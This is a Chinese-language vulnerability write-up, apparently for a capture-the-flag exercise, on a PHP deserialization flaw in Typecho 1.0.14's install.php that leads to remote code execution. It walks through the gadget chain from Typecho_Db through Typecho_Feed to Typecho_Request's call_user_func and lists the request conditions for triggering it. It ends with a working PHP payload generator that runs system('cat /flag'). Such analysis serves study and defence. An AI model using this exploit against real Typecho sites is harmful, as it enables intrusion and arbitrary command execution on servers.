# Typecho反序列化漏洞导致前台getshell

 

源代码 ： Typeco 1.0.14

 

漏洞入口 install.php文件

 

1. 在文件install.php 中

```php
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));

这里存在一个unserialize 反序列化函数 
```

```php
<?php

  $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));

$type = explode('_', $config['adapter']);

  $type = array_pop($type);

  try {

​    $installDb = new Typecho_Db($config['adapter'], $config['prefix']);

​    $installDb->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);

  }

?>
```

```php
base64_decode(Typecho_Cookie::get('__typecho_config')
```

然后找到/Typecho/cookie.php文件

 在这Typecho_Cookie类中

可控参数 __typecho_config 传给了$config ，这里的key就是 __typecho_config 可以通过cookie或者post传入$config

```php
public static function get($key, $default = NULL)

  {

​    $key = self::$_prefix . $key;

​    $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);

​    return is_array($value) ? $default : $value;

  }
```

 在install.php中还有这句

```php
$installDb = new Typecho_Db($config['adapter'], $config['prefix']);
```

这里实例化了一个类，就可以猜想这个类Typecho_Db 中有没有一些我们可控的魔法函数，

这些魔法函数中有没有一些我们可控的危险函数

接着要到 Typecho_Db这个类中寻找。



 \3. /var/Typecho/Db.php

 在Typecho_Db 这个类中，有魔法函数__construct 但是没有可直接利用的危险函数

变量$adapterName 相当于 我们可控$config中的‘adapter’

 

换另一个思路，通过这个类来触发另一个类中的魔法函数

在120行代码中，把一个字符串Typecho_Db_Adapter_和一个变量拼接

这时如果用变量$adapterName也就是$config中的‘adapter’来实例化一个类，就会触发魔法函数__toString。

 

（php是一个弱语言，把一个字符串和另一个类拼接在一起，会强制将类转化成字符串，这时就会触发魔法函数__toString）



 ![wps1](https://user-images.githubusercontent.com/85486547/165091525-f92c7b0d-2527-4ce0-9f8a-c6d73d103b17.jpg)





\4. 接下来就是在文件中查找__toString 的函数

在/var/Typecho/Feed.php 中有__toString函数 在这里依旧没有发现可以直接调用的危险函数.
![wps2](https://user-images.githubusercontent.com/85486547/165090636-233a768c-3b06-4e61-8ab0-626c240d1f6c.jpg)



分析代码

在第290行代码中有一个变量取值的操作

$item 是通过$this->items的foreach循环出来的

![wps3](https://user-images.githubusercontent.com/85486547/165090764-c724975a-340c-4962-8eaa-cc8d5ab66cdc.jpg)

 

根据第112行可以看到$this->_items是Typecho_Feed类的一个private属性

说明$this->_items是我们可控的，也就意味着$item[‘author’] 也是可控的。

 

这时，如果将$item[‘author’]也定义为一个类，当$item[‘author’]->screenName时

就是说$item[‘author’]类调用了一个screenName的变量，但是在$item[‘author’]类中没有定义screenName这个变量，

所以当代码执行到290行：$item[‘author’]->screenName

就会触发__get()魔法函数。
![wps4](https://user-images.githubusercontent.com/85486547/165090803-ddffbf83-0d25-49e5-91bc-3075dddef070.jpg)


 

\5. 接着在文件中搜索__get()函数

文件/var/Typecho/Request.php

Typecho_Request类

发现__get()魔法函数调用了get函数

![wps5](https://user-images.githubusercontent.com/85486547/165090850-c06bfcb5-075a-48d8-95d6-86440a85d047.jpg)

 

get()函数 用调用了_applyFilter()函数


 
![wps6](https://user-images.githubusercontent.com/85486547/165090884-2b9d34ea-85f9-4a2d-ae0c-323b48089cc8.jpg)

```php
在_applyFilter()函数中发现 array_map()函数和call_user_func()函数

array_map() ：返回用户自定义函数作用后的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致

array_map(function,array1,array2,array3...)

![wps7](https://user-images.githubusercontent.com/85486547/165090944-481e59fe-f53c-475c-9605-718f0b4ca527.jpg)

call_user_func() ：调用回调函数，第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。参数可以有多个，也可以是数组。


这两个函数可以执行任意代码，这时要 分析call_user_func($filter,$value)中变量$filter和$value 是否可控，如果不可控就不可以直接利用。
```

 

```php
由  foreach ($this->_filter as $filter)

可以看到$filter  是由 _filter传入的,而_filter 是Typecho_Request类的一个private属性

是可控的
```

![wps8](https://user-images.githubusercontent.com/85486547/165091022-d1970339-be22-402a-9c71-8f6cea86ff1c.jpg)


```php
/var/Typecho/Request.php

在get()函数中可以看到$value是通过 _params[$key] 来获取的，在Typecho_Request类代码第25行  private $_params = array(); 中可以看到 $_params 是可控的，也就是说

$value也是可控的。
```


![wps9](https://user-images.githubusercontent.com/85486547/165091070-ee4d07dd-ee00-411e-bf7b-483fc3e0cd30.jpg)

这时，call_user_func($filter,$value)中变量$filter和$value 都是可控的。这里就是php的反序列化漏洞，这个漏洞可以执行任意代码。

 

```
整体过程：

由install.php 文件中的参数__typecho_config,通过post方法或者cookie从外部读取我们构造的序列化数据，使程序进入类 Typecho_Db 的__construct()函数，然后进入类Typecho_Feed类的__toString()函数，在依次进入Typecho_Request类的_get(),get(),_applyFilter函数，最后由call_user_func()或者array_map函数实现任意代码执行。

 
```

Poc:

 

在install.php 中 

有一些判断的条件 必须存在$_GET[‘finish’] finish 不为空

Referer需要是本站

 

可控参数 __typecho_config 传给了$config ，这里的key就是 __typecho_config 可以	通过cookie或者post传入


![wps10](https://user-images.githubusercontent.com/85486547/165091112-2ed5062a-ce4d-4359-a9ed-0e9dfbf088f4.jpg)

 

综上：

\1. Finish 不为空

\2. Referer需要是本站

\3. __typecho_config 可以通过post或者cookie传入

 

Pyload: 

![wps11](https://user-images.githubusercontent.com/85486547/165091166-67f72523-d5ac-4aa2-a8b1-deb3d4163e69.jpg)

```php
<?php

class Typecho_Request

{

  private $_params = array();

  private $_filter = array();

 

  public function __construct(){

​    $this->_params['screenName'] = 'cat /flag';

​    $this->_filter[0]='system';

​    

  }

}

class Typecho_Feed {

  const RSS2 = 'RSS 2.0';

  private $_type;

  private $_items;

  public function __construct(){

​    $this->_type=self::RSS2;

​    $this->_items[0] = array(

​      'category' => array(new Typecho_Request()),

​      'author' => new Typecho_Request(),

​    );

  }

}

$exp = array(

  'adapter' => new Typecho_Feed(),

  'prefix' => 'typecho_'

);

echo base64_encode(serialize($exp));

?>
```

 

拿到flag

![img](file:///C:\Users\zhangbb\AppData\Local\Temp\ksohtml23176\wps12.jpg) 
